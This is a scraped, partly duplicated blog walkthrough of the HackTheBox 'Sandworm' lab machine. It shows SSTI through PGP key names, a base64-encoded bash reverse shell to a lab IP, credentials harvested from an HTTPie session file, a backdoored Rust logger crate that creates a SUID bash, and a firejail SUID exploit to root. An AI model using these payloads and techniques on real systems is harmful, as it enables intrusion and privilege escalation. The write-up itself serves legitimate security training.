atlas@sandworm:~/.ssh$ ls authorized_keys atlas@sandworm:~/.ssh$ echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCrvOsMQHqYKD7JfCOM4HExbn1Xd4thzE8owKTZzvRry1aaLSi3EumO9pLySC2h9ItTTWlMl1zGl68lzwRbrxgeVbNzw423T/Hzou+RqjsMzbSdvf&lt;snippet&gt;MH0vXHfDoUe5FZbUwZ+S4rgVhwYOniT6ecBWUouwn5C/gb/N85ym2taZTX+2wQNL723s+fdIBtsW3GK5/0vLSuKPxBEa9xkErNuC46oS/1sGsz0k32ZwG+5magDf8YGxlanefgli+09FdCtu8gHJd+T4cmgNYQZ1dA7emysCvNgVC7TSqcfBEGM= root@emsec&quot; &gt;&gt; authorized_keys &lt;mysCvNgVC7TSqcfBEGM= root@emsec&quot; &gt;&gt; authorized_keys bash: authorized_keys: Read-only file system If we try several commands like whoami and sudo -l, we will see that they are not found, which left me a little confused. If we go to the atlas user directories, we will be able to see that there is a .config directory. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 atlas@sandworm:~$ ls -la ls -la total 52 drwxr-xr-x 8 atlas atlas 4096 Nov 17 16:06 . drwxr-xr-x 4 nobody nogroup 4096 May 4 2023 .. lrwxrwxrwx 1 nobody nogroup 9 Nov 22 2022 .bash_history -&gt; /dev/null -rw-r--r-- 1 atlas atlas 220 Nov 22 2022 .bash_logout -rw-r--r-- 1 atlas atlas 3771 Nov 22 2022 .bashrc drwxrwxr-x 2 atlas atlas 4096 Jun 6 08:49 .cache drwxrwxr-x 3 atlas atlas 4096 Feb 7 2023 .cargo drwxrwxr-x 4 atlas atlas 4096 Jan 15 2023 .config -rwxrwxrwx 1 atlas atlas 7955 Nov 17 16:06 exploit.py drwx------ 4 atlas atlas 4096 Nov 18 02:00 .gnupg drwxrwxr-x 6 atlas atlas 4096 Feb 6 2023 .local -rw-r--r-- 1 atlas atlas 807 Nov 22 2022 .profile drwx------ 2 atlas atlas 4096 Nov 17 16:12 .ssh atlas@sandworm:~$ cd .config cd .config atlas@sandworm:~/.config$ ls ls firejail httpie /home/atlas/.config has Firejail and HTTPie. Firejail is a sandbox program designed to prevent security breaches by restricting the environment. Going further, in /home/atlas/.config/httpie/sessions/localhost_5000/admin.json, we have the following: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 { &quot;__meta__&quot;: { &quot;about&quot;: &quot;HTTPie session file&quot;, &quot;help&quot;: &quot;https://httpie.io/docs#sessions&quot;, &quot;httpie&quot;: &quot;2.6.0&quot; }, &quot;auth&quot;: { &quot;password&quot;: &quot;quietLiketheWind22&quot;, &quot;type&quot;: null, &quot;username&quot;: &quot;silentobserver&quot; }, &quot;cookies&quot;: { &quot;session&quot;: { &quot;expires&quot;: null, &quot;path&quot;: &quot;/&quot;, &quot;secure&quot;: false, &quot;value&quot;: &quot;eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIkludmFsaWQgY3JlZGVudGlhbHMuIl19XX0.Y-I86w.JbELpZIwyATpR58qg1MGJsd6FkA&quot; } }, &quot;headers&quot;: { &quot;Accept&quot;: &quot;application/json, */*;q=0.5&quot; } } We have SSH credentials for the silentobserver user SSH : silentobserver:quietLiketheWind22 With these creds, I can SSH as silentobserver 1 2 3 4 5 6 7 ┌──(root㉿emsec)-[~] └─# ssh silentobserver@ssa.htb ...[snip]... Last login: Fri Nov 17 15:51:57 2023 from 10.10.14.112 silentobserver@sandworm:~$ whoami silentobserver silentobserver@sandworm:~$ And read user.txt: 1 2 silentobserver@sandworm:~$ cat user.txt 0646b5ff************************ silentobserver –&gt; atlas Searching for SUID binaries, we found one that doesn’t seem common. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 silentobserver@sandworm:~$ find / -perm -u=s -type f 2&gt;/dev/null /opt/tipnet/target/debug/tipnet /opt/tipnet/target/debug/deps/tipnet-a859bd054535b3c1 /opt/tipnet/target/debug/deps/tipnet-dabc93f7704f7b48 /usr/local/bin/firejail /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/openssh/ssh-keysign /usr/libexec/polkit-agent-helper-1 /usr/bin/mount /usr/bin/sudo /usr/bin/gpasswd /usr/bin/umount /usr/bin/passwd /usr/bin/chsh /usr/bin/chfn /usr/bin/newgrp /usr/bin/su /usr/bin/fusermount3 lib.rs By running pspy, we can deduce that the routine launched every two minutes is executed by root but as the user atlas, that it is Rust, and that the folder to target is /opt/crates In the directory /opt/crates/logger/src, we find a single lib.rs file. Through the process of elimination, we can reasonably assume that this is the file compiled by Atlas every two minutes. 1 2 3 4 5 6 7 8 9 silentobserver@sandworm:/tmp$ cd /opt/crates/logger/src silentobserver@sandworm:/opt/crates/logger/src$ ls lib.rs silentobserver@sandworm:/opt/crates/logger/src$ ls -la total 12 drwxrwxr-x 2 atlas silentobserver 4096 May 4 2023 . drwxr-xr-x 5 atlas silentobserver 4096 May 4 2023 .. -rw-rw-r-- 1 atlas silentobserver 732 May 4 2023 lib.rs silentobserver@sandworm:/opt/crates/logger/src$ Essentially, the code interacts with a database using upstream to pull and manipulate files. Notably, it uses an external library: extern crate logger. What makes this interesting is that the library is not imported from the internet but from the machine itself. So, it must be located within the project. After a brief search, we find it at the path: /opt/crates/logger/src 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 extern crate chrono; use std::fs::OpenOptions; use std::io::Write; use chrono::prelude::*; pub fn log(user: &amp;str, query: &amp;str, justification: &amp;str) { let now = Local::now(); let timestamp = now.format(&quot;%Y-%m-%d %H:%M:%S&quot;).to_string(); let log_message = format!(&quot;[{}] - User: {}, Query: {}, Justification: {}\n&quot;, timestamp, user, query, justification); let mut file = match OpenOptions::new().append(true).create(true).open(&quot;/opt/tipnet/access.log&quot;) { Ok(file) =&gt; file, Err(e) =&gt; { println!(&quot;Error opening log file: {}&quot;, e); return; } }; if let Err(e) = file.write_all(log_message.as_bytes()) { println!(&quot;Error writing to log file: {}&quot;, e); } } If we see its permissions, in the group part it tells us that there are read and write permissions for the silentobserver group : 1 2 silentobserver@sandworm:/opt/crates/logger/src$ ls -la lib.rs -rw-rw-r-- 1 atlas silentobserver 732 May 4 2023 lib.rs Fortunately, we belong to that group: 1 2 silentobserver@sandworm:/opt/crates/logger/src$ id uid=1001(silentobserver) gid=1001(silentobserver) groups=1001(silentobserver) The exploitation involves modifying /opt/crates/logger/src/lib.rs to copy /bin/bash to /tmp/bash and add SUID to it, like this: Modifing lib.rs 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 extern crate chrono; use std::fs::{self, OpenOptions}; use std::io::Write; use std::process::Command; use chrono::prelude::*; pub fn log(user: &amp;str, query: &amp;str, justification: &amp;str) { let now = Local::now(); let timestamp = now.format(&quot;%Y-%m-%d %H:%M:%S&quot;).to_string(); let log_message = format!( &quot;[{}] - User: {}, Query: {}, Justification: {}\n&quot;, timestamp, user, query, justification ); let mut file = match OpenOptions::new() .append(true) .create(true) .open(&quot;/opt/tipnet/access.log&quot;) { Ok(file) =&gt; file, Err(e) =&gt; { println!(&quot;Error opening log file: {}&quot;, e); return; } }; if let Err(e) = file.write_all(log_message.as_bytes()) { println!(&quot;Error writing to log file: {}&quot;, e); } // Copy /bin/bash to /tmp/bash if let Err(e) = fs::copy(&quot;/bin/bash&quot;, &quot;/tmp/bash&quot;) { println!(&quot;Error copying file: {}&quot;, e); return; } // Set SUID permission on /tmp/bash if let Err(e) = Command::new(&quot;chmod&quot;) .args(&amp;[&quot;+s&quot;, &quot;/tmp/bash&quot;]) .output() { println!(&quot;Error setting SUID permission: {}&quot;, e); return; } } Then run /tmp/bash -p after a few minutes to gain control of atlas 1 2 3 4 5 silentobserver@sandworm:/opt/crates/logger/src$ /tmp/bash -p shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory bash-5.1$ whoami atlas bash-5.1$ By adding our public SSH key to the ‘atlas’ user, we can easily connect using SSH. 1 2 3 4 5 6 ┌──(root㉿emsec)-[~/.ssh] └─# ssh -i id_rsa atlas@ssa.htb Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-73-generic x86_64) ...[snip]... Last login: Sat Nov 18 11:21:21 2023 from 10.10.14.43 atlas@sandworm:~$ Privilege escalation : atlas -&gt; root Enumeration Upon checking the user and group ID, it is revealed that the atlas user belongs to a group called ‘jailer’. 1 2 3 atlas@sandworm:~$ id uid=1000(atlas) gid=1000(atlas) groups=1000(atlas),1002(jailer) If we search for SUID biaries we can see one from firejail: 1 2 3 atlas@sandworm:~$ find / -group jailer -ls 2&gt;/dev/null 1344 1740 -rwsr-x--- 1 root jailer 1777952 Nov 29 2022 /usr/local/bin/firejail atlas@sandworm:~$ SUID firejail privilege escalation Here, the next step involves searching Google for firejail exploits that enable privilege escalation. I came across this one: So, acquire the exploit.py, grant it execute permissions, and execute it. Once run, background the process, then execute ‘firejail –join=27179’ and ‘su -‘ to obtain root access. 1 2 3 4 5 6 7 8 9 10 11 12 13 atlas@sandworm:/tmp$ chmod +x exploit.py atlas@sandworm:/tmp$ ./exploit.py You can now run &#39;firejail --join=27179&#39; in another terminal to obtain a shell where &#39;sudo su -&#39; should grant you a root shell. ^Z [1]+ Stopped ./exploit.py atlas@sandworm:/tmp$ firejail --join=27179 changing root to /proc/27179/root Warning: cleaning all supplementary groups Child process initialized in 10.03 ms atlas@sandworm:/tmp$ su - root@sandworm:~# cat /root/root.txt 12d54f557************************* root@sandworm:~# Happy Hacking ! 👾​❤️​ References : What is PGP Encryption and How Does It Work? Making and verifying signatures SSTI (Server Side Template Injection) PayloadsAllTheThings/Server Side Template Injection/ SUID Firejail" /><link rel="canonical" href="/posts/HackTheBox-Sandworm/" /><meta property="og:url" content="/posts/HackTheBox-Sandworm/" /><meta property="og:site_name" content="Mostafa Toumi" /><meta property="og:image" content="/assets/img/favicons/HackTheBox/Sandworm/Sandworm.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2023-11-18T13:00:00+01:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="/assets/img/favicons/HackTheBox/Sandworm/Sandworm.png" /><meta property="twitter:title" content="HackTheBox-Sandworm Walkthrough" /><meta name="twitter:site" content="@EmSec0" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-11-21T14:48:31+01:00","datePublished":"2023-11-18T13:00:00+01:00","description":"Description : Sandworm presents a challenging journey, starting with PGP signatures and SSTI exploration to gain SSH access as ‘silentobserver.’ Uncovered a Rust script running as root, leveraged a firejail vulnerability for privilege escalation, ultimately achieving root access on the Linux machine. Nmap : 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 nmap -p 22,80,443 -sCV ssa.htb Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-17 20:19 GMT Nmap scan report for ssa.htb (10.10.11.218) Host is up (0.15s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA) |_ 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Did not follow redirect to https://ssa.htb/ 443/tcp open ssl/http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) | ssl-cert: Subject: commonName=SSA/organizationName=Secret Spy Agency/stateOrProvinceName=Classified/countryName=SA | Not valid before: 2023-05-04T18:03:25 |_Not valid after: 2050-09-19T18:03:25 |_http-title: Secret Spy Agency | Secret Security Service Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 22.80 seconds from nmap we have OpenSSH 8.9p1 on Port 22, nginx 1.18.0 on Ports 80 and 443 with SSL certificate for “SSA,”. The site redirect us to http://ssa.htb/ website 443 : This site seems to be the online presence of the Secret Spy Agency (SSA), specializing in cryptology, foreign signals intelligence (SIGINT), and cybersecurity services to enhance national security efforts. dirsearch : 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 dirsearch -u ssa.htb /usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html from pkg_resources import DistributionNotFound, VersionConflict _|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| ) Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460 Output File: /root/reports/_ssa.htb/_23-11-17_19-53-48.txt Target: https://ssa.htb/ [19:53:48] Starting: [19:54:12] 200 - 5KB - /about [19:54:15] 302 - 227B - /admin -&gt; /login?next=%2Fadmin [19:54:56] 200 - 3KB - /contact [19:55:20] 200 - 9KB - /guide [19:55:40] 200 - 4KB - /login [19:55:41] 302 - 229B - /logout -&gt; /login?next=%2Flogout Task Completed checking login page , but it seems nothing to do here The notice indicates that the site is powered by Flask, which means this site is using flask framework. Let’s keep that in mind. The contact page showcases a form for submitting encrypted tips. It seems nothing interesting; let’s move on to the guide page Secret Spy Agency’s site appears to provide interactive exercises for PGP encryption/decryption, emphasizing secure communication practices PGP (Pretty Good Privacy) : Background : Pretty Good Privacy (PGP) is a robust encryption protocol that employs a combination of symmetric-key and public-key cryptography for secure message communication. In the encryption process, a random symmetric key is generated for message content, which is then encrypted using the recipient’s public key. Upon receiving the encrypted message, the recipient uses their private key to decrypt the symmetric key, enabling subsequent decryption of the actual message content. PGP ensures end-to-end security, user authentication, and message integrity, making it a widely adopted solution for secure electronic communication Shell as atlas Identify SSTI (Server Side Template Injection) We are moving to the ‘Verify Signature’ section, generating a PGP public key and PGP signed message. This can be done using a PGP tool that is already available on Debian distribution generate pgp public and private keys: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 ┌──(root㉿emsec)-[~emsec/hackthebox/sandworm] └─# gpg --gen-key gpg (GnuPG) 2.2.40; Copyright (C) 2022 g10 Code GmbH This is free software: you are free to change and redistribute it. There is NO WARRANTY, to the extent permitted by law. Note: Use &quot;gpg --full-generate-key&quot; for a full featured key generation dialog. GnuPG needs to construct a user ID to identify your key. Real name: emsec Email address: emsec@emsec.com You selected this USER-ID: &quot;emsec &lt;emsec@emsec.com&gt;&quot; Change (N)ame, (E)mail, or (O)kay/(Q)uit? o We need to generate a lot of random bytes. It is a good idea to perform some other action (type on the keyboard, move the mouse, utilize the disks) during the prime generation; this gives the random number generator a better chance to gain enough entropy. We need to generate a lot of random bytes. It is a good idea to perform some other action (type on the keyboard, move the mouse, utilize the disks) during the prime generation; this gives the random number generator a better chance to gain enough entropy. gpg: revocation certificate stored as &#39;/root/.gnupg/openpgp-revocs.d/C98C59FAEFAD2A327A70709AAD5FD26F46AE1182.rev&#39; public and secret key created and signed. pub rsa3072 2023-11-17 [SC] [expires: 2025-11-16] C98C59FAEFAD2A327A70709AAD5FD26F46AE1182 uid emsec &lt;emsec@emsec.com&gt; sub rsa3072 2023-11-17 [E] [expires: 2025-11-16] Find the pgp public key we just created : 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 ┌──(root㉿emsec)-[~emsec/hackthebox/sandworm] └─# gpg --verbose --armor --export emsec gpg: writing to stdout -----BEGIN PGP PUBLIC KEY BLOCK----- mQGNBGVX8hoBDADhzt0lyX/MRpz5qiuQwdr6AR9U+KgHIlbZ2dwHyhBASe9dYr1X fvFAt/YBrmFKu7X5KGeh6HIQckLhhJcFZ+J37FDcr521Uhfn1tHcNpv8HmURuXVT G1x824bjnEjh/mNv3yszAGMmsTKoU9Pfh7S/KexdepuRVo5VyPZFjDtToClvGmFA RTdY0OgIiocm+FMMPDNTTNmXICfYXNcjLPwYFfYrEdZZD76UDVvQNjF2yz2N1YsK -----------------------&lt;snippet key&gt;---------------------------- 1KQsPHtXFl5nAaki2LAAAF6FL7jfKJ/PHnMq/rFiCwFlDh+zRCCg2yeKnqt8TpcH 5wMVN/EyMmNleI68AonFepIDWXB28U0p/Pstff2TVkqvOLlCB+svpOxnJLgqfwus u1d6LQ85ObGfKyX+RVWXtNWBuYzpXzw6foFI7l197MQ28aWabFdez1GA3SZ9jTab 9eRUTJbTYMNVmpj0FLZrWemSCowFhV0xFq5jcWz0yG9hnmq9fDor5bAdLBRQ3J05 F3MZanTAkQCjZ3ZyyPc294yBcWitytsE/jMlvslxIPtz4IAQWPQdl33Hk+YVlOIK MDkH5NEqU+1Cv72TiQA/JH/wdBgVCcvJT+i4QeHpXeJGBBrUyOourbxN49ZUdegC x/VT3u7XAwzYvjLtnZuZb+jH4WSqWTxFBDXz9Q5y =I2R6 -----END PGP PUBLIC KEY BLOCK----- Generate pgp signed message : Create a file called ‘test’ containing any text. Next, to create a PGP signed message, we will sign this file ‘test’ with our PGP public key using the command: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 ┌──(root㉿emsec)-[~emsec/hackthebox/sandworm] └─# touch test_file ┌──(root㉿emsec)-[~emsec/hackthebox/sandworm] └─# echo &quot;This is emsec&quot; &gt; test_file ┌──(root㉿emsec)-[~emsec/hackthebox/sandworm] └─# gpg --verbose -u emsec --clear-sign test_file gpg: writing to &#39;test_file.asc&#39; gpg: pinentry launched (137563 gnome3:curses 1.2.1 /dev/pts/3 xterm-256color :0.0 20600/0/5 0/0 -) gpg: RSA/SHA512 signature from: &quot;8FF1A1B62986214E emsec &lt;emsec@emsec.com&gt;&quot; ┌──(root㉿emsec)-[~emsec/hackthebox/sandworm] └─# cat test_file.asc -----BEGIN PGP SIGNED MESSAGE----- Hash: SHA512 This is emsec -----BEGIN PGP SIGNATURE----- iQHEBAEBCgAuFiEE5nPSS1qEnKUqTXuNj/GhtimGIU4FAmVX/u8QHGVtc2VjQGVt c2VjLmNvbQAKCRCP8aG2KYYhTqkvDADL+dxWozCGyFv5j0SPR/jZxts8Wzn52cfj 8Khrqsod1xy534K+mWmadv1Un7W70z+DEki6GPuK7bNDGvGPUmuyHzSCGPqUZhl0 0elQDmpc5uDOsVFVfjm+0zk/O34V/YKm6KhSIKNKRkuGgaUI38u/xA0KgHgCs3xW nr1y3PzZ1owdcLFCzeUTpKJKcFgCcSXZSdixC3K7oaiAN2CAF4PBs6RAgMZ0hny5 JNDhUaPEWCIafA7ZFvqE6aKWAesXyUIuMHxGLZ/EcsyleMfuhKsgyQYYusOzbk0H 61NzJjTGDWG4G1cn0eWot51w9gcMPO37ZWyYrMpJXgWpZhG4O76BpytEnLWZaix4 iYJHXWgFtZm0FPJso+ji7hhTa4eyu9Bvhq/r2SVAk4NTvD2INQBipn2CghpYzlu0 /c2fmqmxrUT0W0E86Q/uJXMMn99AZxQSr947Ye/3id0JkRkTnO3z8omdvf9kUIr6 koQWgRor6npAHtqQA/5+LRoubvdY6HM= =OXZm -----END PGP SIGNATURE----- Now let’s go back to /guide and enter the GPG public key and signed text that we just generated. Great! Our signature is valid, but more importantly, we see it reflects our username emsec in the message. This is a good sign because we can manipulate this name to reflect our input. Let’s try SSTI payloads. Find We generate the PGP public key and PGP signed message in the same way as before. By including the ssti codes, we successfully load the payload for SSTI. SSTI diagram from Hacktricks Now we will do the same thing of modifying the username, generating the key, etc., to get RCE and have a rev shell The reason we base64 the reverse shell is that certain characters are not allowed for the username in PGP keys encode the shell to base64 1 echo &quot;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.173/4444 0&gt;&amp;1&#39;&quot; | base64 The finall payload : atlas –&gt; silentobserver Enumeration : I tried to add my public SSH key to the Atlass user, but I got a Read-only file system error. 1 2 3 4 5 atlas@sandworm:~/.ssh$ ls authorized_keys atlas@sandworm:~/.ssh$ echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCrvOsMQHqYKD7JfCOM4HExbn1Xd4thzE8owKTZzvRry1aaLSi3EumO9pLySC2h9ItTTWlMl1zGl68lzwRbrxgeVbNzw423T/Hzou+RqjsMzbSdvf&lt;snippet&gt;MH0vXHfDoUe5FZbUwZ+S4rgVhwYOniT6ecBWUouwn5C/gb/N85ym2taZTX+2wQNL723s+fdIBtsW3GK5/0vLSuKPxBEa9xkErNuC46oS/1sGsz0k32ZwG+5magDf8YGxlanefgli+09FdCtu8gHJd+T4cmgNYQZ1dA7emysCvNgVC7TSqcfBEGM= root@emsec&quot; &gt;&gt; authorized_keys &lt;mysCvNgVC7TSqcfBEGM= root@emsec&quot; &gt;&gt; authorized_keys bash: authorized_keys: Read-only file system If we try several commands like whoami and sudo -l, we will see that they are not found, which left me a little confused. If we go to the atlas user directories, we will be able to see that there is a .config directory. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 atlas@sandworm:~$ ls -la ls -la total 52 drwxr-xr-x 8 atlas atlas 4096 Nov 17 16:06 . drwxr-xr-x 4 nobody nogroup 4096 May 4 2023 .. lrwxrwxrwx 1 nobody nogroup 9 Nov 22 2022 .bash_history -&gt; /dev/null -rw-r--r-- 1 atlas atlas 220 Nov 22 2022 .bash_logout -rw-r--r-- 1 atlas atlas 3771 Nov 22 2022 .bashrc drwxrwxr-x 2 atlas atlas 4096 Jun 6 08:49 .cache drwxrwxr-x 3 atlas atlas 4096 Feb 7 2023 .cargo drwxrwxr-x 4 atlas atlas 4096 Jan 15 2023 .config -rwxrwxrwx 1 atlas atlas 7955 Nov 17 16:06 exploit.py drwx------ 4 atlas atlas 4096 Nov 18 02:00 .gnupg drwxrwxr-x 6 atlas atlas 4096 Feb 6 2023 .local -rw-r--r-- 1 atlas atlas 807 Nov 22 2022 .profile drwx------ 2 atlas atlas 4096 Nov 17 16:12 .ssh atlas@sandworm:~$ cd .config cd .config atlas@sandworm:~/.config$ ls ls firejail httpie /home/atlas/.config has Firejail and HTTPie. Firejail is a sandbox program designed to prevent security breaches by restricting the environment. Going further, in /home/atlas/.config/httpie/sessions/localhost_5000/admin.json, we have the following: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 { &quot;__meta__&quot;: { &quot;about&quot;: &quot;HTTPie session file&quot;, &quot;help&quot;: &quot;https://httpie.io/docs#sessions&quot;, &quot;httpie&quot;: &quot;2.6.0&quot; }, &quot;auth&quot;: { &quot;password&quot;: &quot;quietLiketheWind22&quot;, &quot;type&quot;: null, &quot;username&quot;: &quot;silentobserver&quot; }, &quot;cookies&quot;: { &quot;session&quot;: { &quot;expires&quot;: null, &quot;path&quot;: &quot;/&quot;, &quot;secure&quot;: false, &quot;value&quot;: &quot;eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIkludmFsaWQgY3JlZGVudGlhbHMuIl19XX0.Y-I86w.JbELpZIwyATpR58qg1MGJsd6FkA&quot; } }, &quot;headers&quot;: { &quot;Accept&quot;: &quot;application/json, */*;q=0.5&quot; } } We have SSH credentials for the silentobserver user SSH : silentobserver:quietLiketheWind22 With these creds, I can SSH as silentobserver 1 2 3 4 5 6 7 ┌──(root㉿emsec)-[~] └─# ssh silentobserver@ssa.htb ...[snip]... Last login: Fri Nov 17 15:51:57 2023 from 10.10.14.112 silentobserver@sandworm:~$ whoami silentobserver silentobserver@sandworm:~$ And read user.txt: 1 2 silentobserver@sandworm:~$ cat user.txt 0646b5ff************************ silentobserver –&gt; atlas Searching for SUID binaries, we found one that doesn’t seem common. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 silentobserver@sandworm:~$ find / -perm -u=s -type f 2&gt;/dev/null /opt/tipnet/target/debug/tipnet /opt/tipnet/target/debug/deps/tipnet-a859bd054535b3c1 /opt/tipnet/target/debug/deps/tipnet-dabc93f7704f7b48 /usr/local/bin/firejail /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/openssh/ssh-keysign /usr/libexec/polkit-agent-helper-1 /usr/bin/mount /usr/bin/sudo /usr/bin/gpasswd /usr/bin/umount /usr/bin/passwd /usr/bin/chsh /usr/bin/chfn /usr/bin/newgrp /usr/bin/su /usr/bin/fusermount3 lib.rs By running pspy, we can deduce that the routine launched every two minutes is executed by root but as the user atlas, that it is Rust, and that the folder to target is /opt/crates In the directory /opt/crates/logger/src, we find a single lib.rs file. Through the process of elimination, we can reasonably assume that this is the file compiled by Atlas every two minutes. 1 2 3 4 5 6 7 8 9 silentobserver@sandworm:/tmp$ cd /opt/crates/logger/src silentobserver@sandworm:/opt/crates/logger/src$ ls lib.rs silentobserver@sandworm:/opt/crates/logger/src$ ls -la total 12 drwxrwxr-x 2 atlas silentobserver 4096 May 4 2023 . drwxr-xr-x 5 atlas silentobserver 4096 May 4 2023 .. -rw-rw-r-- 1 atlas silentobserver 732 May 4 2023 lib.rs silentobserver@sandworm:/opt/crates/logger/src$ Essentially, the code interacts with a database using upstream to pull and manipulate files. Notably, it uses an external library: extern crate logger. What makes this interesting is that the library is not imported from the internet but from the machine itself. So, it must be located within the project. After a brief search, we find it at the path: /opt/crates/logger/src 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 extern crate chrono; use std::fs::OpenOptions; use std::io::Write; use chrono::prelude::*; pub fn log(user: &amp;str, query: &amp;str, justification: &amp;str) { let now = Local::now(); let timestamp = now.format(&quot;%Y-%m-%d %H:%M:%S&quot;).to_string(); let log_message = format!(&quot;[{}] - User: {}, Query: {}, Justification: {}\\n&quot;, timestamp, user, query, justification); let mut file = match OpenOptions::new().append(true).create(true).open(&quot;/opt/tipnet/access.log&quot;) { Ok(file) =&gt; file, Err(e) =&gt; { println!(&quot;Error opening log file: {}&quot;, e); return; } }; if let Err(e) = file.write_all(log_message.as_bytes()) { println!(&quot;Error writing to log file: {}&quot;, e); } } If we see its permissions, in the group part it tells us that there are read and write permissions for the silentobserver group : 1 2 silentobserver@sandworm:/opt/crates/logger/src$ ls -la lib.rs -rw-rw-r-- 1 atlas silentobserver 732 May 4 2023 lib.rs Fortunately, we belong to that group: 1 2 silentobserver@sandworm:/opt/crates/logger/src$ id uid=1001(silentobserver) gid=1001(silentobserver) groups=1001(silentobserver) The exploitation involves modifying /opt/crates/logger/src/lib.rs to copy /bin/bash to /tmp/bash and add SUID to it, like this: Modifing lib.rs 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 extern crate chrono; use std::fs::{self, OpenOptions}; use std::io::Write; use std::process::Command; use chrono::prelude::*; pub fn log(user: &amp;str, query: &amp;str, justification: &amp;str) { let now = Local::now(); let timestamp = now.format(&quot;%Y-%m-%d %H:%M:%S&quot;).to_string(); let log_message = format!( &quot;[{}] - User: {}, Query: {}, Justification: {}\\n&quot;, timestamp, user, query, justification ); let mut file = match OpenOptions::new() .append(true) .create(true) .open(&quot;/opt/tipnet/access.log&quot;) { Ok(file) =&gt; file, Err(e) =&gt; { println!(&quot;Error opening log file: {}&quot;, e); return; } }; if let Err(e) = file.write_all(log_message.as_bytes()) { println!(&quot;Error writing to log file: {}&quot;, e); } // Copy /bin/bash to /tmp/bash if let Err(e) = fs::copy(&quot;/bin/bash&quot;, &quot;/tmp/bash&quot;) { println!(&quot;Error copying file: {}&quot;, e); return; } // Set SUID permission on /tmp/bash if let Err(e) = Command::new(&quot;chmod&quot;) .args(&amp;[&quot;+s&quot;, &quot;/tmp/bash&quot;]) .output() { println!(&quot;Error setting SUID permission: {}&quot;, e); return; } } Then run /tmp/bash -p after a few minutes to gain control of atlas 1 2 3 4 5 silentobserver@sandworm:/opt/crates/logger/src$ /tmp/bash -p shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory bash-5.1$ whoami atlas bash-5.1$ By adding our public SSH key to the ‘atlas’ user, we can easily connect using SSH. 1 2 3 4 5 6 ┌──(root㉿emsec)-[~/.ssh] └─# ssh -i id_rsa atlas@ssa.htb Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-73-generic x86_64) ...[snip]... Last login: Sat Nov 18 11:21:21 2023 from 10.10.14.43 atlas@sandworm:~$ Privilege escalation : atlas -&gt; root Enumeration Upon checking the user and group ID, it is revealed that the atlas user belongs to a group called ‘jailer’. 1 2 3 atlas@sandworm:~$ id uid=1000(atlas) gid=1000(atlas) groups=1000(atlas),1002(jailer) If we search for SUID biaries we can see one from firejail: 1 2 3 atlas@sandworm:~$ find / -group jailer -ls 2&gt;/dev/null 1344 1740 -rwsr-x--- 1 root jailer 1777952 Nov 29 2022 /usr/local/bin/firejail atlas@sandworm:~$ SUID firejail privilege escalation Here, the next step involves searching Google for firejail exploits that enable privilege escalation. I came across this one: So, acquire the exploit.py, grant it execute permissions, and execute it. Once run, background the process, then execute ‘firejail –join=27179’ and ‘su -‘ to obtain root access. 1 2 3 4 5 6 7 8 9 10 11 12 13 atlas@sandworm:/tmp$ chmod +x exploit.py atlas@sandworm:/tmp$ ./exploit.py You can now run &#39;firejail --join=27179&#39; in another terminal to obtain a shell where &#39;sudo su -&#39; should grant you a root shell. ^Z [1]+ Stopped ./exploit.py atlas@sandworm:/tmp$ firejail --join=27179 changing root to 